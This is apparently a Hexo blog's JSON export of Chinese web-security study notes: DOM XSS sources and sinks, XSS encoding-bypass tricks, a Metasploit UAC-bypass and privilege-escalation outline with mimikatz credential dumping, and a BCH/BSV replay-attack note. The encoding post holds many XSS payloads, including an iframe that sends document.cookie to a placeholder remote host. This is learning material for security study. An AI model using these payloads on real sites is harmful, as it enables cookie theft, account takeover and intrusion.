{"meta":{"title":"Private Plots of P&W","subtitle":null,"description":"纯净水@流云-自留地，主要涉及web安全方向学习与分享资料","author":"blackj liuyun","url":"http://yoursite.com"},"pages":[{"title":"About Me","date":"2018-12-28T10:24:42.000Z","updated":"2018-12-28T10:31:20.563Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":"给小破邮丢人的Web汪，一直在路上"},{"title":"categories","date":"2018-09-22T17:42:49.000Z","updated":"2018-12-28T17:36:49.901Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":"说明常规渗透XXEXSS业务逻辑ceshi内网渗透内网穿透内网测试信息收集测试1111111111211123区块链安全"},{"title":"tags","date":"2018-09-22T18:05:33.000Z","updated":"2018-09-22T18:05:33.534Z","comments":true,"path":"tags/index-1.html","permalink":"http://yoursite.com/tags/index-1.html","excerpt":"","text":""},{"title":"tags","date":"2018-09-22T18:03:46.000Z","updated":"2018-11-21T04:22:58.560Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"title: 区块链安全date: 2018-09-23 02:03:46 type: “tags”"}],"posts":[{"title":"DOM XSS从javascript中输出数据到HTML页面","slug":"xss/DOM-XSS漏洞挖掘与攻击面延伸","date":"2018-12-28T17:49:01.163Z","updated":"2018-12-28T17:49:01.142Z","comments":true,"path":"2018/12/29/xss/DOM-XSS漏洞挖掘与攻击面延伸/","link":"","permalink":"http://yoursite.com/2018/12/29/xss/DOM-XSS漏洞挖掘与攻击面延伸/","excerpt":"","text":"DOM XSS从javascript中输出数据到HTML页面 存储或反射型XSS是从服务端输出到HTML页面 常见位置URL代入页面定义：通过js直接获取url中的参数，然后输出到HTML页面 通过window.location.search获取页面url传递的参数 1234567891011121314function GetQueryString(name) &#123; var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;); var r = decodeURI(window.location.search.substr(1)).match(reg); if (r != null)return unescape(r[2]); return null;&#125;var sname = GetQueryString(&quot;name&quot;);if(sname!=null)&#123; var sname_ = decodeURIComponent(sname); alert(sname_);&#125; #获取具体参数 document.getElementById(&apos;foo&apos;).innerHTML = getUrlParam(&apos;foo&apos;) #dom型XSS问题 此时取值时，匹配的URL是location.href，这个值包含了 location.search 和 location.hash 的值，而 location.hash 的值是不被传到服务器，但并且能被前端JS通过 getUrlParam 函数成功取值 location.search:获取问号后面的参数如：1http://www.runoob.com/submit.htm?email=someone@ example.com 通过document.write(location.search);获取到的是1?email=someone@example.com location.hash:获取url的锚部分，从“#”开始到最后，都是锚部分，不被传到服务器，但并且能被前端JS通过 getUrlParam 函数成功取值。 跳转类在 javascript 语法中，使用如下代码可以将页面进行跳转操作12345678910111213141516171819202122232425262728293031location.href = urlparams.redirecturl;&lt;!DOCTYPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; function jump()&#123; window.location.href=&quot;javascript:alert(1)&quot;; &#125; &lt;/script&gt; &lt;button type=&quot;button&quot; onclick=&quot;jump()&quot;&gt;test&lt;/button&gt; &lt;/body&gt;&lt;/html&gt;附：//顶层窗口跳转//top.location.href=&apos;http://www.baidu.com&apos;;//父层窗口跳转//parent.location.href=&apos;http://www.baidu.com&apos;;//以下均为本页面跳转//window.location.href=&quot;http://www.baidu.com&quot;;//location.href=&quot;http://www.baidu.com&quot;;//self.location.href=&quot;http://www.baidu.com&quot;;//this.location.href=&quot;http://www.baidu.com&quot;;//location.href=&quot;http://www.baidu.com&quot;;document.location.href 这样的跳转通常会出现在登录页、退出页、中间页。如果开发者让用户可以控制 redirecturl 参数，就可以使用 javascript:alert(1) 的形式进行XSS攻击。最近几年的APP开发比较热门，通过web唤起APP的操作也是越来越多，跳转的协议也是多种多样，例如 webview:// , myappbridge:// 等等。 仅仅使用 http 和 https 来判断URL是否合法已经不适用了，于是由跳转所产生的DOM-XSS漏洞也逐渐增多。 测试关注点 输入点123456789101112document.locationdocument.URLdocument.URLUnencodeddocument.referrerwindow.location（href hash）所有的inputswindow.namedocument.cookieXMLhttpRequest返回的数据localstorage····· 以下几个地方是js输出到HTML的必经之路 输出点123456789document.write()document.writeln()xxx.innerHTML=xxx.outerHTML=innerHTML.replace=document.attachEvent()window.attachEvent()document.location.replace()document.location.assign() 缓存类开发者在缓存前端数据的时候，通常会存在 sessionStorage , localStorage , cookie 中，因为 sessionStorage 在页面刷新时就失效的特性，利用方式相对简单的只有后面两种。 参考学习12345https://code.google.com/archive/p/domxsswiki/ domxss 备忘单https://cstcamaro.github.io/post/2018-ISC-%E6%BC%94%E8%AE%B2%E7%A8%BF?tdsourcetag=s_pctim_aiomsghttp://blog.nsfocus.net/xss-advance/#23_DOM","categories":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/categories/Web安全/"},{"name":"XSS","slug":"Web安全/XSS","permalink":"http://yoursite.com/categories/Web安全/XSS/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"http://yoursite.com/tags/XSS/"}]},{"title":"编码绕过xss","slug":"xss/编码绕过XSS","date":"2018-12-01T16:00:00.000Z","updated":"2018-12-29T02:51:41.982Z","comments":true,"path":"2018/12/02/xss/编码绕过XSS/","link":"","permalink":"http://yoursite.com/2018/12/02/xss/编码绕过XSS/","excerpt":"","text":"标签img、video、audio、iframe中的src属性只能请求，不能执行，在ie8以前可以;但可以使用js伪协议调用js12345&lt;iframe src=&quot;javascript:alert(&apos;iframe&apos;)&quot; width = &quot;0&quot; height = &quot;0&quot;/&gt;&lt;iframe src=&quot;javascript:var img=document.createElement(&apos;img&apos;);img.src=&apos;http://xx.xxx.xxx.xxx/log&apos;+escape(document.cookie);document.body.appendChild(img);&quot;/&gt; Base64编码绕过一般应用场景：12&lt;a href=&quot;可控点&quot;&gt;&lt;iframe src=&quot;可控点&quot;&gt; 当在这种情况下 过滤了&lt;&gt;’ “ javascript的话 就可以尝试使用base64编码绕过 123&lt;a href=&quot;data:text/html;base64, PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==&quot;&gt;test&lt;/a&gt;&lt;img src=x onerror=alert(1)&gt; 这样当test A链接时,就会以data协议 页面以html/text的方式解析 编码为base64 然后单点击a链接时 base64的编码就被还原成原本的 HTML编码16进制/10进制 &amp;#x/&amp;html实体编码本身只是为了防止与html本身语义标记的冲突。html正常只识别html10进制、html16进制,不会在html标签中解析js的那些编码，因此在比如onerror后放置js的编码比如jsunicode、js八进制、js16进制是不会解析的。1&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt; magic_quote_gpc绕过在遇到php中magic_quote_gpc（版本5.4之后已经移除了） 魔术变量处理开关转义，即便存储到后台的数据也会是转义的，如果输入的数据有单引号（’）、双引号（”）、反斜线（）与 NUL（NULL 字符）等字符都会被加上反斜线。针对该设置，进行xss绕过的话，通常使用js的string.fromCharCode()12345678&lt;?php$a=$_GET[&apos;id&apos;];echo $a;?&gt;http://localhost:8888/ev_php/xss_gpc.php?id=%3Cscript%3Ealert(String.fromCharCode(34,%2049,%2034))%3C/script%3E&lt;script&gt;alert(String.fromCharCode(34, 49, 34))&lt;/script&gt; string.fromCharCode()： Unicode 字符值中返回一个字符串 javascript jsunicode 8进制和16进制[&lt;] 分别是 \\u003c \\74 \\x3c 宽字节绕过头部Base绕过url编码【1】浏览器在发出url前会进行一次url编码，针对部分字符，以firefox为例子： 12345发出的请求 &apos;&quot; &lt;script&gt;alert(1)&lt;/script&gt; 服务端接收到的请求 %27%22%20%3Cscript%3Ealert(1)%3C/script%3E服务端自动解码一次返回数据（默认） &apos;&quot; &lt;script&gt;alert(1)&lt;/script&gt; 这也是为什么提交payload的时候可以不编码、urlencode注意 浏览器的urlencode 应该是不包括%的，和常规的urlencode不太一样 双重编码在某些时候测试xss中，可能会遇到payload中被htmlspecialcahrs编码，但可以针对服务端进行双重编码绕过，推测该后端代码1234&lt;?php$a=htmlspecialchars($_GET['id']);echo urldecode($a);?&gt; 在该url中经过htmlspecialchars处理后，又再次进行了urldecode，相当于进行了两次urldecode，又因为经过编码绕过了htmlspecialchars的处理，故触发了该xss 三重编码和双重绕过类似，推测多出来的一次是因为在htmlspecialchars前又进行了一次编码，如果没有后面那一行”echo urldecode($a);” 过滤是正常的，两者问题都出在此处12345&lt;?php$a=$_GET['id'];$a1=htmlspecialchars($a);echo urldecode($a1);?&gt; 浏览器编码解码原理为了更深入的了解xss的结果和原理，不得不了解浏览器的工作原理，以及解码顺序。浏览器中具有URL解析引擎、HTML解析引擎、JS解析引擎主要构成： 用户界面 浏览器引擎－ 用来查询及操作渲染引擎的接口 渲染引擎－ 用来显示请求的内容，例如，如果请求内容为html，它负责解析html及css，并将解析后的结果显示出来 网络－ 用来完成网络调用，例如http请求，它具有平台无关的接口，可以在不同平台上工作 UI 后端－ 用来绘制类似组合选择框及对话框等基本组件，具有不特定于某个平台的通用接口，底层使用操作系统的用户接口 JS解释器－ 用来解释执行JS代码 数据存储－ 属于持久层，浏览器需要在硬盘中保存类似cookie的各种数据，HTML5定义了web database技术，这是一种轻量级完整的客户端存储技术 重点是接下来的编码解码顺序首先是URL解析: 用户在浏览器中填写一个资源定位标识，浏览器在将内容发送给对应的服务器，服务器对浏览器发过来的请求信息进行URL解析，在这个过程中遇到%号时会对该url进行url解码，该解码位置在于服务端自动解码一次，不需要编写代码，浏览器自身是不会进行url解码的案例： 在客户端提交一次经过urlencode的字符串，在接收到服务端的返回数据时，已经经过urldecode了，而服务端如果直接返回urlencode的数据，浏览器接收到仍然用urlencode的形式渲染，在xss中并不会起作用,测试代码如下，有点乱 小尴尬：12345&lt;?phpecho $a1=$_GET[&apos;id&apos;];echo &quot;1&lt;/br&gt;&quot;;echo $a2 =&quot;%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e&quot;;?&gt; 在测试中a2的xss仍然以urlencode的形式返回到浏览器而不会解析，而以get方式提交的id，以urlencode形式提交则会解析触发xss HTMl/SVG/XHTML 解析浏览器在接收到页面数据时，会首先对该数据进行HTML解析来构造DOM树，构造的过程与语言的编译过程是相似的，接收文档，先进行词法分析，然后语法分析，构建解析树。HTML 的分析器只能识别特定的词法规则，才能构建起DOM 树，这一块，HTML 不会做解码的工作因此以下代码无效：即标签本身结构不能变化1&lt;img src&amp;#x3d;&quot;http://xxx.xxx.xx.xxx&quot;&gt; 在DOM构建完成后，才开始识别节点内容对html实体编码的内容进行解码 构造DOM树解析树是由DOM元素和属性节点构成的树结构，根节点是Document对象，DOM与标记一一对应1234567891011&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt; &lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;&lt;/p&gt;&lt;h1&gt;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; 对应的DOM树：123456789graph TDst(HTMLDocument)--&gt;aa(HTML)a--&gt;b1(head)a--&gt;b2(body)b1--&gt;c1(meta)b1--&gt;c2(title)b2--&gt;p1(p)b2--&gt;p2(h) 解析过程是迭代的，解析器从词法分析器处取到一个新的符号，并试着用这个符号匹配一条语法规则，如果匹配了一条规则，这个符号对应的节点将被添加到解析树上，然后解析器请求另一个符号。如果没有匹配到规则，解析器将在内部保存该符号，并从词法分析器取下一个符号，直到所有内部保存的符号能够匹配一项语法规则。如果最终没有找到匹配的规则，解析器将抛出一个异常，这意味着文档无效或是包含语法错误。 123如：&lt;img11 src=1 onerror=&apos;a(1)&apos;&gt;在浏览器解析时会报错：HTML 文档的字符编码未声明。如果该文件包含 US-ASCII 范围之外的字符，该文件将在某些浏览器配置中呈现为乱码。页面的字符编码必须在文档或传输协议层声明。 untitled.html 而最后输出的树，也就是这里的解析树，是由DOM元素及属性节点组成的DOM树构建完毕后 html编码就会被解析，html解析中无法用常规的自下而上或自上而下的解析器进行解析原因在于： 语言的宽容本质 浏览器历来对一些常见的无效html用法采取包容态度 解析过程需要不断地重复，源内容在解析过程中通常不会改变，但是在 HTML 中，脚本标记如果包含 document.write，就会添加额外的标记，这样解析过程实际上就更改了输入内容，浏览器创建了自定义的解释器来解析HTML html解释器算法 标记化和树构建标记化是词法分析过程、将输入内容解析成多个标记构建解析流程图如下：1234567graph TDst[network]--&gt;a1a1[tokeniser]--&gt;a2a2&#123;tree construction&#125;--&gt;a3[DOM]a2&#123;tree construction&#125;--&gt;a4[ScriptExecution]a4[ScriptExecution]--&gt;a1a3--&gt;a4 标记生成器识别标记，传递给树构造器，然后接受下一个字符以识别下一个标记；如此反复直到输入的结束 js解释器在处理如这样的标签，解释器会切换到特殊解析模式，在src href 后边加入的JavaScript 等的html解码后，进入js的解析模式，进入该模式后，该DOM节点已经建立起了。 所以先进行jsunincode编码再进行html编码可以正常触发1&lt;a href=&quot;javascript:alert&amp;#40;&amp;#39;&amp;#60;&amp;#92;&amp;#117;&amp;#52;&amp;#101;&amp;#48;&amp;#48;&amp;#62;&amp;#39;&amp;#41;&quot;&gt;test&lt;/a&gt; 在测试中 先进行html实体编码，再进行js16进制转码，不会正常解码1源码:&lt;a href=&quot;javascript:alert(&apos;test&apos;)&quot;&gt;test&lt;/a&gt; 测试输出为unicode编码：1234先html:&lt;a href=&quot;javascript:alert(&apos;&amp;#116;&amp;#101;&amp;#115;&amp;#116;&apos;)&quot;&gt;test&lt;/a&gt;再js16进制：&lt;a href=&quot;javascript:alert(&apos;\\x26\\x23\\x31\\x31\\x36\\x3b\\x26\\x23\\x31\\x30\\x31\\x3b\\x26\\x23\\x31\\x31\\x35\\x3b\\x26\\x23\\x31\\x31\\x36;&apos;)&quot;&gt;test&lt;/a&gt; 正常输出：test1&lt;a href=&quot;javascript:alert(&apos;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&amp;#92;&amp;#120;&amp;#54;&amp;#53;&amp;#92;&amp;#120;&amp;#55;&amp;#51;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&apos;)&quot;&gt;test&lt;/a&gt; 1234先js 16进制:&lt;a href=&quot;javascript:alert(&apos;\\x74\\x65\\x73\\x74&apos;)&quot;&gt;test&lt;/a&gt;再html编码：&lt;a href=&quot;javascript:alert(&apos;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&amp;#92;&amp;#120;&amp;#54;&amp;#53;&amp;#92;&amp;#120;&amp;#55;&amp;#51;&amp;#92;&amp;#120;&amp;#55;&amp;#52;&apos;)&quot;&gt;test&lt;/a&gt; 先进行html编码再进行unicode编码 解析失败1&lt;a href=&quot;javascript:\\u0026\\u0023\\u0039\\u0037\\u003b\\u0026\\u0023\\u0031\\u0030\\u0038\\u003b\\u0026\\u0023\\u0031\\u0030\\u0031\\u003b\\u0026\\u0023\\u0031\\u0031\\u0034\\u003b\\u0026\\u0023\\u0031\\u0031\\u0036\\u003b(&apos;1111&apos;)&quot;&gt;test&lt;/a&gt; 先进行unicode编码再进行html编码解析成功1&lt;a href=&quot;javascript:&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#49;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#99;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#54;&amp;#53;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#50;&amp;#92;&amp;#117;&amp;#48;&amp;#48;&amp;#55;&amp;#52;(&apos;1111&apos;)&quot;&gt;test&lt;/a&gt; 综上 浏览器对于编码解码的顺序 url解码-html解码-js解码 tips:经测试 js16进制/8进制只会在js 字符串中解析，如果作为变量名、触发事件则不会解析如： 思考：&lt;&lt;白帽子讲Web安全&gt;&gt;1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt; var x2=\\x61\\x6c\\x65rt(1); var x1=&quot; &apos;onclick=alert(1);//&apos;&quot; var x=&quot;\\x20\\x27onclick\\x3dalert\\x281\\x29\\x3b\\x2f\\x2f\\27&quot;; document.write(&quot;&lt;a href=&apos;&quot;+x1+&quot;&apos;&gt;test&lt;a&gt;&quot;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 可以用以下例子来尝试看一下弹窗顺序1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;img src=1 onerror=&apos;a(1)&apos;&gt;&lt;script type=&quot;text/javascript&quot;&gt; a(2);&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; function a(c)&#123; alert(c); &#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot;&gt; a(3);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 参考 0x_Jin 凯神的《XSS与字符编码那些事儿》 案例xss中禁用了&amp;#符号实体编码是由&amp;#组成的，这个时候只能考虑能不能通过url编码绕过&amp;#，再让浏览器解码成 &amp;# 然后拼接x27 最后就成为了单引号的html16进制编码来绕过借用凯神的案例1&lt;a href=&quot;javascript:location=&apos;./3.3.php?offset=&apos;+document.getElementById(&apos;pagenum&apos;).value+&apos;&amp;searchtype_yjbg=yjjg&amp;searchvalue_yjbg=&apos;&quot;&gt;GO&lt;/a&gt; 提交的payload：1wooyun%26%23x27,alert(1)%2b%26%23x27 解码后1&apos;,alert(1)&apos; 感谢在@星尘的指导下，从新捋了捋xss编码的问题，现阶段就暂时到这吧。还是沉淀不够。革命尚未成功，同志尚需努力啊 by @流云 在线工具在线编码解码工具：https://www.mokuge.com/tool/unicode/ 参考 https://www.cesafe.com/5075.html http://su.xmd5.org/static/drops/tips-689.html 宽字节： http://book.2cto.com/201301/14515.html http://itindex.net/detail/47408-xss-%E5%AD%A6%E4%B9%A0-xss http://www.wooyun.org/bugs/wooyun-2010-015969 https://blog.csdn.net/u013648937/article/details/46629827","categories":[{"name":"Web渗透","slug":"Web渗透","permalink":"http://yoursite.com/categories/Web渗透/"},{"name":"常规渗透","slug":"Web渗透/常规渗透","permalink":"http://yoursite.com/categories/Web渗透/常规渗透/"},{"name":"XSS","slug":"Web渗透/常规渗透/XSS","permalink":"http://yoursite.com/categories/Web渗透/常规渗透/XSS/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://yoursite.com/tags/XSS/"},{"name":"Web渗透","slug":"Web渗透","permalink":"http://yoursite.com/tags/Web渗透/"},{"name":"常规渗透","slug":"常规渗透","permalink":"http://yoursite.com/tags/常规渗透/"}]},{"title":"msf下 windows内核提权方法","slug":"1119msf下windows内核提权方法","date":"2018-08-22T18:11:33.000Z","updated":"2018-12-28T17:42:31.241Z","comments":true,"path":"2018/08/23/1119msf下windows内核提权方法/","link":"","permalink":"http://yoursite.com/2018/08/23/1119msf下windows内核提权方法/","excerpt":"","text":"msf下 windows内核提权方法简介：在渗透测试中，当目标机器是windows系统时，在反弹shell后，会涉及到上传mimikatz抓取用户密码，以便在域环境中更好的获取用户信息及渗透，此时就涉及到权限不够，需要通过各类exp来进行本地提权，来将用户权限提取为system权限。首先来看看在msf下进行提权的方法 msf自带exp提权模块local exploit suggester这个模块可以帮助识别系统存在的可被利用的漏洞，并根据架构、平台、会话类型、和默认选项来提供合适的exp进行提权，而不用去手动搜索。 应用实例 前提条件：已获取反弹回的meterpreter会话，但是为低权限用户 演示 1、通过前文所述的采用shellcode执行器和执行代码分离绕过杀软，并执行，返回shell，建立meterpreter会话。 [] 提权模块实战之 exploit/windows/local/bypassuac_eventvwr项uac绕过模块 bypassuac_eventvwr 简介：通过注册表eventvwr绕过UAC UAC：用户账户控制,vista及以上版本操作系统采用的控制机制，目的是为了阻止不必要的系统范围更改，确保仅以管理员及system用户进行更改，在程序涉及到系统更改或涉及特定的动作即会要求以管理员身份执行，否则将会阻止 目的：获取用户system权限正常情况下获取的meterpreter会话中权限为登陆用户的权限 在使用该模块后提权后，再通过msf内置的getsystem，可将用户权限提升为system权限使用前 使用后：会话成功提权为system，可进一步进行mimikatz抓取 成功抓取 RottenPotato /Juicy Potato 提权##","categories":[{"name":"内网提权","slug":"内网提权","permalink":"http://yoursite.com/categories/内网提权/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"http://yoursite.com/tags/内网渗透/"}]},{"title":"BCH分叉-重放攻击解决方案","slug":"BCH分叉","date":"2018-07-22T18:11:33.000Z","updated":"2018-12-28T17:41:18.323Z","comments":true,"path":"2018/07/23/BCH分叉/","link":"","permalink":"http://yoursite.com/2018/07/23/BCH分叉/","excerpt":"","text":"BCH分叉 重放攻击解决方案BCH在进行硬分叉：分为BCH和BCHSV 对于分叉前拥有BCH的用户，在分叉后该钱包中会拥有BCH/BSV两种虚拟货币，若是分叉前钱包里有BCH，在硬分叉完成后，这个钱包里也会生成相应的BSV 目的：分离同一地址中 共同存在的BCH和BSV 来防重放攻击针对转账业务限制条件：该用户账户拥有BCH的同时也拥有BSV利用原理：在用户原意在分叉后转帐 BCH 时，该消息被攻击者广播在BSV链上，导致用户的BSV资产也被转移，受到重放攻击。 INPUT污染法分离：INPUT污染法的原理：就是用分叉后的BCH混入分叉前的BCH，从而达到分离BCH与BSV的目的。具体操作如下： 在分叉完成后，用分叉后的BCH币充值到分叉前的BCH币所在的钱包，然后将这个钱包里所有的BCH币（分叉前的BCH和分叉后的BCH）转移到另一个地址。此次交易在BCH链可以成功完成，但是在BSV链上广播时却不能被节点接受，因为这笔交易离存在着分叉后的BCH币。这样子，BSV还是存在于原本的钱包中，达到了将BCH和BSV分离的目的。 构造特有的操作码交易：分叉后的BCH和BSV链的共识机制有一定的区别，主要体现在操作码上， BCH链上交易时，构造含有 OP_CHECKDATASIG 操作码的输出 BCHSV链上交易时，构造含有 OP_MUL 操作码的输出","categories":[{"name":"区块链安全","slug":"区块链安全","permalink":"http://yoursite.com/categories/区块链安全/"}],"tags":[{"name":"区块链安全","slug":"区块链安全","permalink":"http://yoursite.com/tags/区块链安全/"}]},{"title":"Hello World","slug":"hello-world","date":"2018-07-22T09:00:41.812Z","updated":"2018-07-22T09:00:41.812Z","comments":true,"path":"2018/07/22/hello-world/","link":"","permalink":"http://yoursite.com/2018/07/22/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]}